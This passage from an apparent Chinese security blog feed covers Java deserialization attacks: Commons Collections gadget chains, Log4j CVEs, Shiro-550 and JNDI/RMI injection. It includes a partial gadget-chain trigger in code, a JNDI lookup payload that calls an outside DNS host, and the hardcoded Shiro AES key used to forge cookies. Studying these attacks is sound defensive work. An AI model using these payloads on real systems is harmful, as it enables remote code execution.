将Transformer链封装为ChainedTransformer</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">    <span class="comment">// 创建原始Map并装饰为TransformedMap</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line">    <span class="comment">// 触发执行链</span></span><br><span class="line">        outerMap.put(<span class="string">&quot;zeo&quot;</span>, <span class="string">&quot;666&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Commons-Collection链</title>
      <link href="/article/cc-chain/"/>
      <url>/article/cc-chain/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>参考文章</p><ol><li><a href="https://blog.csdn.net/qq_36869808/article/details/129539246">csdn-CC链总结</a></li><li><a href="https://www.cnblogs.com/1vxyz/p/17284838.html">博客园-Java反序列化Commons-Collection篇01-CC1链</a></li><li><a href="https://www.freebuf.com/articles/web/390210.html">freebuf-Java安全 CC链1分析</a></li><li><a href="https://geekdaxue.co/read/maxsecurity@mbxigk/yztya9">个人博客-Java Web学习</a></li><li><a href="https://xz.aliyun.com/news/9835">先知社区-通俗易懂的Java Commons Collection 2分析</a></li><li><a href="https://www.cnblogs.com/1vxyz/category/2260818.html">博客园-1vxyz-随笔分类-Java安全</a></li></ol><h1>介绍</h1><p>Apache Commons Collections 是一个为 Java 提供扩展集合类的开源项目, 它提供了一系列有用的集合类和算法, 可以使编程变得更加简单, 快捷和高效</p><p>CC链（Commons Collections反序列化漏洞利用链）是Java安全领域中最具代表性的反序列化攻击技术之一, 其核心通过恶意构造的序列化对象触发Apache Commons Collections库中的反射机制, 最终实现任意代码执行</p><h1>环境准备</h1><p>JDK版本：CC1、CC3、CC5、CC6、CC7 建议使用JDK 8u65或更低版本JDK 8u71后修复了AnnotationInvocationHandler的触发逻辑</p><p>Commons Collections版本：CC1-CC3、CC5-CC7 使用 3.2.1；CC2、CC4 使用 4.0注意：3.2.2/4.1版本增加了安全限制，但若启用不安全序列化属性仍可能存在风险</p><p>工具：推荐使用<a href="../../../../../%E5%B7%A5%E5%85%B7/Web/ysoserial.md">ysoserial</a>生成Payload进行测试</p><p>CC1可以看<a href="https://www.freebuf.com/articles/web/390210.html">Java安全 CC链1分析</a>的第一部分来配置IDEA和java 8u66(我用这个版本进行复现)</p><p>CC2可以看<a href="https://xz.aliyun.com/news/9835">先知社区-通俗易懂的Java Commons Collection 2分析</a>配置IDEA环境</p><h1>前置知识</h1><ul><li><a href="../../Java%E4%BB%A3%E7%90%86.md">Java代理</a></li><li><a href="../../Java%E5%9F%BA%E7%A1%80.md">Java基础</a></li><li><a href="../../Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.md">Java反序列化</a></li><li>Apache Commons Collections库中的常用API(写在对应文章里面得了)</li></ul><h1>CC链</h1><p>流程图总览<a href="CC%E5%88%A9%E7%94%A8%E9%93%BE.excalidraw.md">CC利用链.excalidraw</a></p><h2 id="CC1-TransformedMap"><a class="header-anchor" href="#CC1-TransformedMap">¶</a>CC1 TransformedMap</h2><p>入口: <code>AnnotationInvocationHandler#readObject</code>核心组件: <code>TransformedMap</code>条件: jdk 1.7限制</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">  AnnotationInvocationHandler.readObject()</span><br><span class="line">    memberValues.entrySet().iterator().next().setValue()</span><br><span class="line">      TransformedMap.checkSetValue()</span><br><span class="line">        ChainedTransformer.transform()</span><br><span class="line">          ConstantTransformer.transform() [获取Runtime类]</span><br><span class="line">          InvokerTransformer.transform() [反射获取getRuntime方法]</span><br><span class="line">          InvokerTransformer.transform() [反射调用getRuntime方法]</span><br><span class="line">          InvokerTransformer.transform() [反射调用exec方法执行命令]</span><br></pre></td></tr></table></figure><ul><li><a href="CC%E8%BF%AD%E4%BB%A3%E8%B0%83%E7%94%A8%E9%93%BE.md">CC迭代调用链</a></li><li><a href="TransformedMap%E8%B0%83%E7%94%A8%E9%93%BE.md">TransformedMap调用链</a></li><li><a href="AnnotationInvocationHandler-readObject%E8%B0%83%E7%94%A8%E9%93%BE.md">AnnotationInvocationHandler-readObject调用链</a></li></ul><h2 id="CC1-LazyMap"><a class="header-anchor" href="#CC1-LazyMap">¶</a>CC1 LazyMap</h2><p>入口: <code>AnnotationInvocationHandler#readObject</code>核心组件: <code>LazyMap</code>条件: jdk 1.7限制</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">  AnnotationInvocationHandler.readObject()</span><br><span class="line">    memberValues.entrySet().iterator().next().getValue()</span><br><span class="line">      Proxy.invoke() [动态代理调用]</span><br><span class="line">        LazyMap.get()</span><br><span class="line">          factory.transform() [ChainedTransformer.transform()]</span><br><span class="line">            迭代调用链</span><br></pre></td></tr></table></figure><ul><li><a href="LazyMap%E8%B0%83%E7%94%A8%E9%93%BE.md">LazyMap调用链</a></li><li><a href="AnnotationInvocationHandler%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E8%B0%83%E7%94%A8%E9%93%BE.md">AnnotationInvocationHandler动态代理调用链</a></li></ul><h2 id="CC2-PriorityQueue"><a class="header-anchor" href="#CC2-PriorityQueue">¶</a>CC2 PriorityQueue</h2><p>入口: <code>TransformingComparator#compare</code>核心组件: <code>PriorityQueue</code>, <code>TemplatesImpl</code>条件: jdk无限制, CommonsCollections4</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">  PriorityQueue.readObject()</span><br><span class="line">    heapify()</span><br><span class="line">      siftDown()</span><br><span class="line">        siftDownUsingComparator()</span><br><span class="line">          TransformingComparator.compare()</span><br><span class="line">            InvokerTransformer.transform()</span><br><span class="line">              TemplatesImpl.newTransformer()</span><br><span class="line">                TemplatesImpl.getTransletInstance()</span><br><span class="line">                  TransletClassLoader.defineClass() [加载恶意字节码]</span><br><span class="line">                   恶意类的静态代码块/构造函数执行 [命令执行]</span><br></pre></td></tr></table></figure><ul><li><a href="TemplatesImpl%E5%BA%95%E5%B1%82%E8%B0%83%E7%94%A8%E9%93%BE.md">TemplatesImpl底层调用链</a></li><li><a href="TransformingComparator.md">TransformingComparator</a></li><li><a href="PriorityQueue.md">PriorityQueue</a></li></ul><h2 id="CC3-TrAXFilter"><a class="header-anchor" href="#CC3-TrAXFilter">¶</a>CC3 TrAXFilter</h2><p>入口: <code>AnnotationInvocationHandler#readObject</code>核心组件: <code>TrAXFilter</code>, <code>TemplatesImpl</code>条件: jdk1.7</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">  AnnotationInvocationHandler.readObject()</span><br><span class="line">    memberValues.entrySet().iterator().next().getValue()</span><br><span class="line">      Proxy.invoke() [动态代理调用]</span><br><span class="line">        LazyMap.get()</span><br><span class="line">          factory.transform() [ChainedTransformer.transform()]</span><br><span class="line">            ConstantTransformer.transform() [获取TrAXFilter类]</span><br><span class="line">            InstantiateTransformer.transform()</span><br><span class="line">              TrAXFilter构造函数()</span><br><span class="line">                templates.newTransformer() [TemplatesImpl.newTransformer()]</span><br><span class="line">                  TemplatesImpl.getTransletInstance()</span><br><span class="line">                    TransletClassLoader.defineClass() [加载恶意字节码]</span><br><span class="line">                     恶意类的静态代码块/构造函数执行 [命令执行]</span><br></pre></td></tr></table></figure><p>别看很长, 其实是拼接CC1的<code>lazyMap.get() -&gt; InvokerTransformer.transform()</code></p><ul><li><a href="TrAXFilter.md">TrAXFilter</a></li></ul><h2 id="CC4-组合利用"><a class="header-anchor" href="#CC4-组合利用">¶</a>CC4 组合利用</h2><p>入口: <code>TransformingComparator#compare</code>核心组件: <code>PriorityQueue</code>, <code>TrAXFilter</code>条件: CommonsCollections4</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">  PriorityQueue.readObject()</span><br><span class="line">    heapify()</span><br><span class="line">      siftDown()</span><br><span class="line">        siftDownUsingComparator()</span><br><span class="line">          TransformingComparator.compare()</span><br><span class="line">            ChainedTransformer.transform()</span><br><span class="line">              ConstantTransformer.transform() [获取TrAXFilter类]</span><br><span class="line">              InstantiateTransformer.transform()</span><br><span class="line">                TrAXFilter构造函数()</span><br><span class="line">                  templates.newTransformer() [TemplatesImpl.newTransformer()]</span><br><span class="line">                    TemplatesImpl.getTransletInstance()</span><br><span class="line">                      TransletClassLoader.defineClass() [加载恶意字节码]</span><br><span class="line">                       恶意类的静态代码块/构造函数执行 [命令执行]</span><br></pre></td></tr></table></figure><p>结合CC2的<code>PriorityQueue</code>触发点和CC3的<code>TrAXFilter</code>利用方式</p><ul><li><a href="CC4.md">CC4</a></li></ul><h2 id="CC5-TiedMap"><a class="header-anchor" href="#CC5-TiedMap">¶</a>CC5 TiedMap</h2><p>入口: <code>BadAttributeValueExpException#readObject</code>核心组件: <code>TiedMapEntry</code>, <code>LazyMap</code>条件: 无任何要求，可以直接使用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">  BadAttributeValueExpException.readObject()</span><br><span class="line">    val.toString() [TiedMapEntry.toString()]</span><br><span class="line">      TiedMapEntry.getValue()</span><br><span class="line">        LazyMap.get()</span><br><span class="line">          factory.transform() [ChainedTransformer.transform()]</span><br><span class="line">            迭代调用链</span><br></pre></td></tr></table></figure><ul><li><a href="CC5.md">CC5</a></li></ul><h2 id="CC6-hashCode"><a class="header-anchor" href="#CC6-hashCode">¶</a>CC6 hashCode</h2><p>入口: <code>HashMap#hash -&gt; TiedMapEntry#hashCode</code>核心组件: <code>TiedMapEntry</code>, <code>HashMap</code>条件: 无任何要求，可以直接使用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">  HashSet.readObject()</span><br><span class="line">    HashMap.put()</span><br><span class="line">      HashMap.hash()</span><br><span class="line">        TiedMapEntry.hashCode()</span><br><span class="line">          TiedMapEntry.getValue()</span><br><span class="line">            LazyMap.get()</span><br><span class="line">              factory.transform() [ChainedTransformer.transform()]</span><br><span class="line">                迭代调用链</span><br></pre></td></tr></table></figure><ul><li><a href="CC6.md">CC6</a></li></ul><blockquote><p>走urldns反序列化一套</p></blockquote><h2 id="CC7"><a class="header-anchor" href="#CC7">¶</a>CC7</h2><p>入口: <code>Hashtable#reconstitutionPut</code>核心组件: <code>Hashtable</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">  Hashtable.readObject()</span><br><span class="line">    Hashtable.reconstitutionPut()</span><br><span class="line">      AbstractMap.equals()</span><br><span class="line">        TiedMapEntry.equals()</span><br><span class="line">          TiedMapEntry.getValue()</span><br><span class="line">            LazyMap.get()</span><br><span class="line">              factory.transform() [ChainedTransformer.transform()]</span><br><span class="line">                迭代调用链</span><br></pre></td></tr></table></figure><blockquote><p>在CC6的基础上多走了一步 HashTable</p></blockquote><ul><li><a href="CC7.md">CC7</a></li></ul><h1>关键链解析</h1><h2 id="CC3链-TrAXFilter与字节码加载"><a class="header-anchor" href="#CC3链-TrAXFilter与字节码加载">¶</a>CC3链-TrAXFilter与字节码加载</h2><p>CC3链的核心目的是绕过一些安全规则对InvokerTransformer类的限制（例如黑名单)</p><p>它不再直接使用<code>InvokerTransformer</code>来调用方法，而是利用了<code>TrAXFilter</code>类; CC3链通过<code>InstantiateTransformer</code>来实例化<code>TrAXFilter</code>类，并传入恶意构造的<code>TemplatesImpl</code>对象，最终在实例化过程中触发<code>TemplatesImpl#newTransformer()</code>，加载并执行其中的恶意字节码; 这使得CC3链更侧重于类加载而非直接的命令执行</p><h2 id="CC6链-hashCode的利用"><a class="header-anchor" href="#CC6链-hashCode的利用">¶</a>CC6链-hashCode的利用</h2><p>CC6链提供了一种非常通用的触发方式; 它通过<code>TiedMapEntry#hashCode()</code>方法触发<code>TiedMapEntry#getValue()</code>, 进而调用<code>LazyMap#get()</code>和后续的<code>Transformer</code>链</p><p>该链的触发点<code>HashMap#hash()</code>在反序列化读取数据时会被调用, 因此<strong>不受JDK版本限制</strong>, 适用性非常广泛</p><h2 id="CC4链-组合利用"><a class="header-anchor" href="#CC4链-组合利用">¶</a>CC4链-组合利用</h2><p>CC4链可以看作是CC2和CC3思想的结合; 它像CC2一样使用<code>PriorityQueue</code>和<code>TransformingComparator</code>作为触发入口, 但像CC3一样使用<code>InstantiateTransformer</code>来实例化<code>TrAXFilter</code>并最终触发<code>TemplatesImpl</code>中的字节码, 从而避免使用可能被禁用的<code>InvokerTransformer</code></p><h1>绕过技术与历史修复</h1><h2 id="JDK版本的绕过"><a class="header-anchor" href="#JDK版本的绕过">¶</a>JDK版本的绕过</h2><p>JDK 8u71+修复了<code>AnnotationInvocationHandler#readObject</code>的逻辑，导致直接依赖它的CC1链失效; 应对策略是寻找新的触发点, 如CC6利用<code>HashMap#hashCode()</code>, CC2/CC4利用<code>PriorityQueue#readObject()</code>中的比较器</p><h2 id="Commons-Collections的修复"><a class="header-anchor" href="#Commons-Collections的修复">¶</a>Commons Collections的修复</h2><p>在3.2.2和4.1版本中, 官方试图修复漏洞;</p><p>例如，在3.2.2版本中，对<code>InvokerTransformer</code>、<code>InstantiateTransformer</code>等类的序列化支持增加了开关</p><p>这些开关默认情况下关闭，反序列化这些类会抛出<code>UnsupportedOperationException</code>异常; 若要启用，需设置系统属性<code>org.apache.commons.collections.enableUnsafeSerialization=true</code></p><p>需要注意的是, 3.2.2版本的修复并不彻底, 因为它只是增加了一个默认关闭的开关, 如果应用程序在启动时启用了不安全的序列化属性, 仍然可能存在风险</p><h1>其他</h1><h2 id="Commons-Collections3和4的区别"><a class="header-anchor" href="#Commons-Collections3和4的区别">¶</a>Commons Collections3和4的区别</h2><p>Commons Collections 3和4是Java编程语言中的开源类库，用于提供更多的集合数据结构和工具类。它们的主要区别如下：</p><p>架构：Commons Collections 4使用了新的架构，通过更好的设计和实现，提高了性能和可用性。</p><p>功能：Commons Collections 4新增了一些功能，例如BloomFilter，MultiValuedMap等。</p><p>兼容性：Commons Collections 4支持Java 8和以上版本，而Commons Collections 3只支持Java 7及以下版本。</p><p>依赖：Commons Collections 4移除了对其他类库的依赖，例如BeanUtils和ComparatorUtils，这使得它更加轻便和易用。</p><p>Commons Collections 4是一个更为现代化和高效的Java集合类库，更适合使用Java 8及以上版本。但如果你仍然需要在Java 7及以下版本中使用，那么Commons Collections 3是一个不错的选择。</p><h2 id="利用链的演变与绕过"><a class="header-anchor" href="#利用链的演变与绕过">¶</a>利用链的演变与绕过</h2><p>JDK版本适配问题JDK 8u71+修复了AnnotationInvocationHandler的触发逻辑，导致CC1链失效。</p><p>替代方案：CC3链：引入TemplatesImpl类，通过字节码加载执行命令。CC6链：改用HashSet和HashMap的hashCode()触发点79。</p><p>Commons Collections的修复与绕过官方修复（3.2.2+）：在InvokerTransformer中增加序列化开关，默认关闭反序列化功能58。绕过手段：使用其他危险类（如InstantiateTransformer）构造新链，或依赖未修复的4.x版本组件</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Log4j反序列化</title>
      <link href="/article/6591/"/>
      <url>/article/6591/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>参考文章</p><ul><li><a href="https://www.anquanke.com/post/id/229489">安全KER-Apache Log4j反序列化详细分析</a></li><li><a href="https://github.com/fengxuangit/log4j_vuln">github-Log4J 漏洞复现+漏洞靶场</a></li></ul><h1>介绍</h1><p>在项目中显示相关日志最原始的方式就是在代码段中添加相关打印的语句, 这样可以在运行时掌握程序的运行状态; 为了方便的查看日志, 需要封装一个日志打印的操作类</p><p>Log4j是Apache的开源项目, 可以实现对System.out等打印语句的替代, 并且可以结合spring等项目, 实现把日志输出到控制台或文件等</p><p>本次的两个漏洞均为未对传入的需要反序列化的数据做过滤, 导致了恶意构造从而造成相关反序列化漏洞</p><h1>漏洞</h1><h2 id="CVE-2017-5645"><a class="header-anchor" href="#CVE-2017-5645">¶</a>CVE-2017-5645</h2><h3 id="影响版本"><a class="header-anchor" href="#影响版本">¶</a>影响版本</h3><p>Log4j 2.x &lt;= 2.8.1</p><h3 id="具体分析"><a class="header-anchor" href="#具体分析">¶</a>具体分析</h3><p>反序列化入口为ObjectinputStreamLogEventBridge.class类的<code>logEvents()</code>函数的<code>inputStream.readObject()</code></p><p>由于对传入的数据没有进行过滤, 因此若存在, 即可通过commons-collections的Gadget链直接实现反序列化漏洞(CC链又出现了)</p><h2 id="CVE-2019-17571"><a class="header-anchor" href="#CVE-2019-17571">¶</a>CVE-2019-17571</h2><h3 id="影响版本-v2"><a class="header-anchor" href="#影响版本-v2">¶</a>影响版本</h3><p>Log4j 1.2.x &lt;= 1.2.17</p><h3 id="具体分析-v2"><a class="header-anchor" href="#具体分析-v2">¶</a>具体分析</h3><p>反序列化入口为SimpleSocketServer.class的run()中的代码</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">event = (LoggingEvent)<span class="built_in">this</span>.ois.readObject();</span><br></pre></td></tr></table></figure><p>当获取的this.ois不为null时直接用<code>readObject()</code>进行反序列化, 造成反序列化漏洞, 利用方式同样是打<code>commons-collections</code>的Gadget链</p><h2 id="CVE-2021-44228"><a class="header-anchor" href="#CVE-2021-44228">¶</a>CVE-2021-44228</h2><h3 id="影响版本-v3"><a class="header-anchor" href="#影响版本-v3">¶</a>影响版本</h3><p>Apache Log4j 2.x &lt;= 2.14.1 &lt;= Log4j 2.15.0-rc1</p><h3 id="影响组件"><a class="header-anchor" href="#影响组件">¶</a>影响组件</h3><ul><li>Spring-boot-strater-log4j2</li><li>Apache Solr</li><li>Apache Flink</li><li>Apache Druid</li></ul><h3 id="漏洞验证"><a class="header-anchor" href="#漏洞验证">¶</a>漏洞验证</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;jndi:idap://579d2205.dns.1433.eu.org.&#125;</span><br></pre></td></tr></table></figure><blockquote><p>Java 8u191+ 默认阻止远程类加载</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shiro反序列化</title>
      <link href="/article/shiro-unser/"/>
      <url>/article/shiro-unser/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>参考文章</p><ul><li><a href="https://www.anquanke.com/post/id/228889">安全KER-Shiro反序列化漏洞详细分析</a></li><li><a href="https://www.freebuf.com/vuls/290922.html">freebuf-Apache Shiro反序列化漏洞-Shiro-550复现总结</a></li><li><a href="https://blog.csdn.net/Bossfrank/article/details/130173880">csdn-shiro550反序列化漏洞原理与漏洞复现（基于vulhub，保姆级的详细教程）</a></li><li><a href="https://www.bilibili.com/video/BV1iF411b7bD">bilibili-Shiro反序列化漏洞(一)-shiro550流程分析</a></li></ul><h1>shiro-550 介绍</h1><p>shiro-550（shiro小于1.2.5）主要是由shiro的<code>rememberMe</code>内容反序列化导致的命令执行漏洞</p><p>造成的原因是AES密钥被硬编码在shiro源码中, 这就导致了可以通过在cookie的<code>rememberMe</code>字段插入payload实现任意代码执行</p><p>在这以后shiro使用随机密钥, 而不再硬编码, 这又造成<code>padding oracle attack</code>导致的shiro-721</p><h1>特征</h1><p>返回包中包含rememberMe=deleteMe字段</p><p>请求包中存在rememberMe=remember-me, 返回包中存在rememberMe=deleteMe字段以及一段很长的rememberMe=…, 可以通过base64解码</p><p>当客户端再次请求服务端时，都会带上这个服务端第一次返回设置的Set-Cookie里面的rememberMe的密文，让服务端进行身份验证</p><h1>动调</h1><h2 id="加密"><a class="header-anchor" href="#加密">¶</a>加密</h2><p>断点位置为AbstractShiroFilter.class的<code>doFilterInternal()</code></p><p>尝试登录后进入<code>onSuccessfulLogin()</code>继续步入<code>rememberMeSuccessfulLogin()</code>函数</p><p>RememberMeManager参数不为空，步入AbstractRememberMeManager的<code>onSuccessfulLogin()</code>, 随后到达<code>convertPrincipalsToBytes()</code>函数</p><p>发现首先将进行序列化，之后由<code>this.getCipherService()</code>获取到加密服务方式不为空后，进入<code>this.encrypt(bytes)</code>阶段</p><p><code>encrypt()</code>函数的CipherKey就是AbstractRememberMeManager.class开头的</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">DEFAULT_CIPHER_KEY_BYTES=<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br></pre></td></tr></table></figure><p>获取CipherKey返回后进入<code>cipherService.encrypt</code>函数中，生成初始化向量<code>ivBytes</code>后，进入具体的加密函数，最后return</p><p>然后就是记住身份并将信息加入到cookie中</p><h2 id="解密"><a class="header-anchor" href="#解密">¶</a>解密</h2><p>同样在相同位置下断点</p><p>单步到<code>resolvePrincipals()</code>函数, 进入<code>this.getRememberedPrincipals(subjectContext)</code>, 其中有两个函数</p><p>第一个函数<code>getRememberedSerializedIdentity()</code>中, 先获取cookie中的值, 然后base64解密, 生成二进制数后返回</p><p>第二个函数<code>convertBytesToPrincipals()</code>中，先获取解密服务不为空后，将二进制数据传入decrypt函数进行解密，之后<code>return this.deserialize(bytes)</code></p><p>在<code>deserialize(bytes)</code>中有<code>readObject()</code>，触发apache.commons利用链漏洞</p><h2 id="总结"><a class="header-anchor" href="#总结">¶</a>总结</h2><p>加密时：序列化转为二进制、encrypt加密、base64加密、放入cookie解密时：从cookie中取出、base64解密、decrypt解密、反序列化在利用时，可以根据硬编码在源码中的key构造payload</p><h1>怎么打-待完善</h1><p>一般都是说用<code>commons-collections</code>依赖(简称CC?)</p><p>但是网站正常运行时不一定会使用这个依赖, 所以我们会使用<code>commons-beanutils</code></p><blockquote><p>IDEA有插件可以查看有哪些依赖真正运行(仅有compile和runtime真正运行)</p></blockquote><p><a href="../%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE/CC%E9%93%BE/CC%E9%93%BE.md">CC链</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化漏洞核心组件</title>
      <link href="/article/Java-pre01/"/>
      <url>/article/Java-pre01/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p><strong>RMI/JNDI/LDAP/BeanFactory</strong></p><h1>RMI</h1><p>RMI(Remote Method Invocation), Java提供的<strong>远程方法调用</strong>机制，支持跨 JVM 的对象通信(一个JVM中的对象调用另一个JVM中的对象方法)</p><h2 id="核心特性"><a class="header-anchor" href="#核心特性">¶</a>核心特性</h2><ul><li><strong>分布式通信</strong>：实现跨网络的方法调用</li><li><strong>动态类加载</strong>：支持从远程 URL 加载类文件（漏洞关键点）</li><li><strong>RMI Registry</strong>：中央注册服务（默认端口 1099），管理远程对象引用</li></ul><h2 id="利用方式"><a class="header-anchor" href="#利用方式">¶</a>利用方式</h2><ol><li>攻击者搭建RMI服务器和HTTP服务器托管恶意class</li><li>靶机向RMI服务器查询恶意对象</li><li>服务器返回一个指向恶意class文件的Reference对象(指向HTTP服务器中的class文件)</li><li>靶机向HTTP服务器请求加载恶意class, 服务器返回恶意字节码</li><li>靶机实例化并执行恶意代码</li></ol><h1>JNDI</h1><p>JNDI 是 Java 平台的核心服务接口, 提供<strong>统一的命名和目录访问能力</strong>, 允许 Java 应用程序通过标准化 API 访问各种命名和目录服务</p><blockquote><p>JNDI 本质是设计良好的服务集成框架, 漏洞源于早期版本对动态类加载的安全控制不足</p></blockquote><h2 id="核心概念"><a class="header-anchor" href="#核心概念">¶</a>核心概念</h2><table><thead><tr><th>概念</th><th>说明</th></tr></thead><tbody><tr><td>命名服务</td><td>名称→对象的映射（类似 DNS），核心操作: <code>bind()/lookup()</code></td></tr><tr><td>目录服务</td><td>增强版命名服务，支持对象+属性管理（如 LDAP)</td></tr></tbody></table><h3 id="命名服务-Naming-Service"><a class="header-anchor" href="#命名服务-Naming-Service">¶</a>命名服务 (Naming Service)</h3><p>核心功能：将名称 (Name) 绑定到对象 (Object), 类似电话簿（名称→电话号码）或 DNS（域名→IP）</p><p>关键操作：</p><ul><li><code>bind()</code>：将名称绑定到对象</li><li><code>lookup()</code>：通过名称查找对象</li><li><code>rebind()</code>：重新绑定</li><li><code>unbind()</code>：解除绑定</li></ul><h3 id="目录服务-Directory-Service"><a class="header-anchor" href="#目录服务-Directory-Service">¶</a>目录服务 (Directory Service)</h3><ul><li>扩展功能：在命名服务基础上增加<strong>属性管理</strong></li><li>特点：对象可附带属性（如用户对象包含邮箱/部门等）</li></ul><h2 id="JNDI-架构分层"><a class="header-anchor" href="#JNDI-架构分层">¶</a>JNDI 架构分层</h2><p><img src="../../../../image/202507251039.png" alt=""></p><h3 id="应用层-JNDI-API"><a class="header-anchor" href="#应用层-JNDI-API">¶</a>应用层 (JNDI API)</h3><p>开发者使用的统一接口 <code>javax.naming.*</code></p><p>示例代码：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line"><span class="type">DataSource</span> <span class="variable">ds</span> <span class="operator">=</span> (DataSource) ctx.lookup(<span class="string">&quot;java:comp/env/jdbc/mydb&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="服务提供层-SPI"><a class="header-anchor" href="#服务提供层-SPI">¶</a>服务提供层 (SPI)</h3><p>协议适配器：将 JNDI API 映射到具体服务</p><p>常见提供者：<code>rmi</code>: → RMI 协议<code>ldap</code>: → LDAP 协议<code>dns</code>: → DNS 查询<code>file</code>: → 文件系统</p><h3 id="底层服务"><a class="header-anchor" href="#底层服务">¶</a>底层服务</h3><p>实际的服务实现（如 OpenLDAP、RMI Registry）</p><h2 id="关键组件"><a class="header-anchor" href="#关键组件">¶</a>关键组件</h2><table><thead><tr><th>组件</th><th>说明</th></tr></thead><tbody><tr><td>InitialContext</td><td>JNDI 入口点，通过环境配置连接服务</td></tr><tr><td>Context</td><td>核心接口，提供命名操作 (lookup/bind)</td></tr><tr><td>Reference</td><td>对象的间接引用 (包含类名+工厂类+地址)</td></tr><tr><td>NamingManager</td><td>管理对象工厂的创建过程</td></tr><tr><td>ObjectFactory</td><td>工厂接口，将 Reference 转换为实际对象</td></tr></tbody></table><h2 id="JNDI注入原理"><a class="header-anchor" href="#JNDI注入原理">¶</a>JNDI注入原理</h2><p><img src="../../../../image/202507251017.png" alt=""></p><p><strong>漏洞触发条件</strong>：</p><ol><li>应用执行<code>lookup()</code>时使用外部可控参数</li><li>JDK 版本 &lt; 8u191（默认允许远程类加载）</li><li>存在危险工厂类（如 <code>BeanFactory</code>）</li></ol><h2 id="安全演进与防护"><a class="header-anchor" href="#安全演进与防护">¶</a>安全演进与防护</h2><table><thead><tr><th>JDK 版本</th><th>安全改进</th></tr></thead><tbody><tr><td>≤8u121</td><td>无防护，可直接利用</td></tr><tr><td>8u121+</td><td>限制 RMI 远程类加载 ( trustURLCodebase=false )</td></tr><tr><td>8u191+</td><td>默认禁用所有协议的远程类加载</td></tr><tr><td>11.0.1+</td><td>完全移除 RMI Reference 的远程类加载能力</td></tr></tbody></table><h1>LDAP</h1><p>LDAP是轻量级目录访问协议, 用于访问和维护分布式目录信息服务(如用户身份信息、组织架构等)</p><h2 id="与JNDI的关系"><a class="header-anchor" href="#与JNDI的关系">¶</a>与JNDI的关系</h2><ul><li>JNDI 通过 <code>ldap://</code> 协议支持 LDAP 访问</li><li>LDAP 条目可存储 Java 对象引用（ <code>javaSerializedData</code> 或 <code>javaReferenceAddress</code> ）</li><li>可作为JNDI注入的替代载体</li><li>替代 RMI 成为高版本 JDK 